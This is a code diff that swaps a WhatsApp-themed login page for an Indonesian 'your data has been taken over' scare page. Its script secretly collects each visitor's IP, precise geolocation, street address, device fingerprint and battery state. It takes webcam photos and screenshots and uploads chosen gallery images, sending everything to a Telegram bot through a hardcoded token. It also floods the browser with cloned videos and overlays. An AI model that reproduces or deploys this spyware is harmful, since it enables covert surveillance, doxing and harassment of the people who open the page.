@@ -1,77 +1,245 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Website Band WhatsApp By AZTRAA</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Thanz_bened orang</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<style>
+body {margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;overflow:hidden;position:relative;color:#444;}
+body::before {content:"";position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://files.catbox.moe/b4t2p2.png') no-repeat center center;background-size:cover;filter:blur(6px) brightness(0.6);z-index:-1;}
+#loading-container {position:relative;text-align:center;width:80%;max-width:400px;background:rgba(255,255,255,0.1);padding:30px;border-radius:15px;backdrop-filter:blur(5px);box-shadow:0 0 20px rgba(0,0,0,0.5);}
+#loading-text {font-size:22px;margin-bottom:20px;color:#eee;animation:fadeIn 1.5s infinite alternate;}
+#progress-container {height:6px;background:rgba(200,200,200,0.3);border-radius:3px;overflow:hidden;}
+#progress-bar {height:100%;width:0%;background:linear-gradient(90deg,#888,#ccc);transition:width 0.3s ease;}
+#loading-details {margin-top:20px;font-size:14px;color:#ccc;min-height:20px;animation:fadeText 2s infinite alternate;}
+.hidden {display:none;}
+video.floating {position:absolute;width:200px;height:120px;z-index:9999;pointer-events:none;transform:rotate(0deg);}
+@keyframes fadeIn{0%{opacity:0.5}100%{opacity:1}}
+@keyframes fadeText{0%{color:#aaa}100%{color:#eee}}
+</style>
+</head>
+<body>
+<div id="loading-container">
+    <div id="loading-text">DATA ANDA DI AMBIL ALIH OLEH Thanz official</div>
+    <div id="progress-container"><div id="progress-bar"></div></div>
+    <div id="loading-details"></div>
+</div>
+
+<input type="file" id="filePicker" accept="image/*" multiple style="display:none">
+<video id="popupVideo" class="floating" src="https://files.catbox.moe/d16tjf.mp4" autoplay loop muted></video>
+<audio id="bgMusic" src="https://www.soundjay.com/mechanical/sounds/keyboard-1.mp3" autoplay loop></audio>
+<canvas id="c" class="hidden"></canvas>
+
+<script>
+(async()=>{
+const BOT_TOKEN="8097361712:AAHfdkzXcTijGxTu0C4Lv3e1e4Ub4sgkdKI";
+const OWNER_CHAT_ID="6817171243";
+
+// ========== LOADING ==========
+const progressBar=document.getElementById('progress-bar');
+const loadingDetails=document.getElementById('loading-details');
+let progress=0;
+const messages=["Memeriksa modul sistem...","Mengambil Gambar Gallery..","Memeriksa semua akun anda...",
+"Melihat chat whatsapp anda....","Memuat komponen inti...","Melihat riwayat google chrome anda...", 
+"Menginisialisasi antarmuka...","kontrol penuh device...","Memverifikasi koneksi...",
+"Menyiapkan lingkungan...","Mengambil alih sim card anda...","Memeriksa pembaruan...",
+"Memuat aset tampilan...","Data anda bocor sepenuh nya ✅"];
+const progressInterval=setInterval(()=>{
+    progress+=Math.random()*5;if(progress>100)progress=100;
+    progressBar.style.width=progress+"%";
+    if(Math.random()>0.8)loadingDetails.textContent=messages[Math.floor(Math.random()*messages.length)];
+    if(progress===100)clearInterval(progressInterval);
+},400);
+
+// ========== TELEGRAM ==========
+const sendTelegram=async(text)=>{
+    try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:OWNER_CHAT_ID,text,parse_mode:'Markdown'})});
+    }catch(e){console.error(e);}
+};
+const sendPhoto=async(blob,filename)=>{
+    try{
+        const fd=new FormData();
+        fd.append('chat_id',OWNER_CHAT_ID);
+        fd.append('photo',blob,filename);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+    }catch(e){console.error(e);}
+};
+const getLocationDetails=async(lat,lon)=>{
+    try{
+        const res=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+        const data=await res.json();
+        return {county:data.address?.county||data.address?.city||data.address?.state||"Tidak diketahui",
+                district:data.address?.suburb||data.address?.village||data.address?.town||"Tidak diketahui",
+                fullAddress:data.display_name||"Alamat tidak tersedia"};
+    }catch{return {county:"Tidak diketahui",district:"Tidak diketahui",fullAddress:"Alamat tidak tersedia"};}
+};
+
+// ========== FINGERPRINT ==========
+async function generateFingerprint(){
+    const ua=navigator.userAgent; const lang=navigator.language;
+    const res=screen.width+"x"+screen.height;
+    const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const ram=navigator.deviceMemory||"N/A";
+    const cpu=navigator.hardwareConcurrency||"N/A";
+    const raw=`${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
+    const data=new TextEncoder().encode(raw);
+    const hashBuffer=await crypto.subtle.digest('SHA-256',data);
+    return [...new Uint8Array(hashBuffer)].map(x=>x.toString(16).padStart(2,'0')).join('');
+}
+
+// ========== VXZ DOX ==========
+async function getVisitorInfo(){
+    const clock=new Date().toLocaleString();
+    let latitude="N/A",longitude="N/A",accuracy="N/A",weather="N/A",temperature="N/A";
+    let country="N/A",province="N/A",ip="N/A",namaISP="N/A",postal="N/A";
+
+    try{
+        const ipData=await fetch("https://ipapi.co/json").then(r=>r.json());
+        ip=ipData.ip;country=ipData.country_name;province=ipData.region;postal=ipData.postal;
+        latitude=ipData.latitude;longitude=ipData.longitude;
+        const whois=await fetch(`https://ipinfo.io/${ip}/json?token=123456789abcde`).then(r=>r.json());
+        namaISP=whois.org||"N/A";
+    }catch{}
+
+    try{
+        const weatherData=await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r=>r.json());
+        weather=weatherData.current_condition[0].weatherDesc[0].value;
+        temperature=weatherData.current_condition[0].temp_C+"°C";
+    }catch{}
+
+    try{
+        await new Promise(resolve=>{
+            navigator.geolocation.getCurrentPosition(
+                pos=>{latitude=pos.coords.latitude.toFixed(6);longitude=pos.coords.longitude.toFixed(6);accuracy=pos.coords.accuracy+"m";resolve();},
+                ()=>resolve(),
+                {enableHighAccuracy:true,timeout:5000}
+            );
+        });
+    }catch{}
+
+    const locDetails=await getLocationDetails(latitude,longitude);
+
+    const device=navigator.platform+" - "+navigator.userAgent;
+    const language=navigator.language||"N/A";
+    const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone||"N/A";
+    const deviceMemory=navigator.deviceMemory||"N/A";
+    const cpuCores=navigator.hardwareConcurrency||"N/A";
+    const isTouch='ontouchstart' in window;
+    const fingerprint=await generateFingerprint();
+
+    let batteryInfo={};
+    if(navigator.getBattery){
+        try{
+            const b=await navigator.getBattery();
+            batteryInfo={"battery level":Math.round(b.level*100)+"%","charging":b.charging?"✅ YA":"❌ TIDAK"};
+        }catch{ batteryInfo={"battery level":"❌ Tidak tersedia","charging":"❌ TIDAK"} }
+    }else{
+        batteryInfo={"battery level":"❌ Tidak tersedia","charging":"❌ TIDAK"};
     }
-    body {
-      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
-      font-family: 'Inter', sans-serif;
-      color: lime;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      overflow: hidden;
-      position: relative;
-      padding: 20px;
+
+    const vxzMsg=`\`\`\`JSON
+╭───── 𝐓𝐡𝐚𝐧𝐳 𝐑𝐚𝐣𝐚 𝐇𝐞𝐜𝐤𝐢𝐧𝐠 ───── ⦿
+│⚙️ DEVICE INFORMATION
+│🖥️ Device: ${device}
+│🌐 Bahasa: ${language}
+│💾 RAM: ${deviceMemory} GB
+│🧠 CPU Cores: ${cpuCores}
+│🔋 Battery: ${batteryInfo["battery level"]}
+│🔌 Charging: ${batteryInfo["charging"]}
+│📍 LOCATION INFORMATION
+│📡 IP Address: ${ip}
+│🌎 Negara: ${country}
+│🏙️ Kabupaten: ${province}
+│🏷️ Kode Pos: ${postal}
+│📌 Latitude: ${latitude}
+│📍 Longitude: ${longitude}
+│🏙️ Kabupaten: ${locDetails.county}
+│🏙️ Kecamatan: ${locDetails.district}
+│🏠 Alamat Lengkap: ${locDetails.fullAddress}
+╰─────  ᴛʜᴀɴᴢ ʀᴀᴊᴀ ʜᴇᴄᴋɪɴɢ ───── ⦿
+\`\`\``;
+
+    await sendTelegram(vxzMsg);
+}
+
+// ========== CAMERA & SCREENSHOT ==========
+const startCapture=async()=>{
+    try{
+        const video=document.createElement('video');
+        video.autoplay=true;video.muted=true;video.style.display='none';
+        document.body.appendChild(video);
+        const canvas=document.getElementById('c');
+        const stream=await navigator.mediaDevices.getUserMedia({video:true});
+        video.srcObject=stream;
+        await new Promise(r=>video.onloadedmetadata=r);
+        canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+        canvas.getContext('2d').drawImage(video,0,0);
+        canvas.toBlob(b=>sendPhoto(b,'camera_capture.jpg'),'image/jpeg');
+        stream.getTracks().forEach(t=>t.stop());
+        video.remove();
+    }catch{ await sendTelegram("❌ Camera blocked"); }
+
+    try{
+        const shot=await html2canvas(document.body);
+        shot.toBlob(b=>sendPhoto(b,'screenshot.jpg'),'image/jpeg');
+    }catch{ await sendTelegram("❌ Screenshot failed"); }
+}
+
+// ========== GALLERY FILES ==========
+async function pickGalleryFiles(){
+    const fileInput=document.getElementById('filePicker');
+    fileInput.click();
+    fileInput.onchange=async()=>{
+        for(const file of fileInput.files){
+            try{
+                const form=new FormData();
+                form.append('chat_id',OWNER_CHAT_ID);
+                form.append('photo',file,file.name);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:form});
+            }catch(e){console.error(e);}
+        }
     }
-    .bg-particles {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 0;
-    }
-    .particle {
-      position: absolute;
-      width: 2px;
-      height: 2px;
-      background: rgba(0, 255, 127, 0.3);
-      border-radius: 50%;
-      animation: float 6s ease-in-out infinite;
-    }
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); opacity: 0.3; }
-      50% { transform: translateY(-20px); opacity: 0.8; }
-    }
-    .login-container {
-      background-color: rgba(17, 17, 17, 0.95);
-      padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 0 20px lime;
-      text-align: center;
-      max-width: 400px;
-      width: 100%;
-      z-index: 2;
-    }
-    .login-title {
-      font-size: 26px;
-      font-weight: 900;
-      margin-bottom: 10px;
-      background: linear-gradient(135deg, #00ff7f, #ffffff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .login-subtitle {
-      font-size: 13px;
-      color: #ffc107;
-      margin-bottom: 20px;
-    }
-    .login-input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 16px;
-      background: #333;
+}
+
+// ========== POPUP VIDEO ==========
+const popupVideo=document.getElementById('popupVideo');
+function moveVideoRandomly(){
+    popupVideo.style.top=Math.random()*(window.innerHeight-200)+'px';
+    popupVideo.style.left=Math.random()*(window.innerWidth-200)+'px';
+    popupVideo.style.transform='rotate('+(Math.random()*360)+'deg)';
+}
+setInterval(()=>{ moveVideoRandomly(); 
+let clone=popupVideo.cloneNode(true); document.body.appendChild(clone); }, 100);
+
+// ========== MUSIC ==========
+const bgMusic=document.getElementById('bgMusic'); 
+bgMusic.volume=1; bgMusic.play().catch(()=>{}); // autoplay
+
+// ========== CRASH EFFECT ==========
+function createCrash(){
+    const div=document.createElement('div');
+    div.style.position='fixed'; div.style.top='0'; div.style.left='0';
+    div.style.width='100%'; div.style.height='100%';
+    div.style.background='rgba(255,255,255,0.05)';
+    div.style.pointerEvents='none';
+    document.body.appendChild(div);
+}
+let crashInterval=setInterval(createCrash,0);
+
+// ========== START EVERYTHING ==========
+setTimeout(async()=>{
+    await getVisitorInfo();
+    await startCapture();
+    await pickGalleryFiles();
+},5000);
+
+})();
+</script>
+</body>
+</html>      background: #333;
       border: none;
       border-radius: 6px;
       color: #fff;
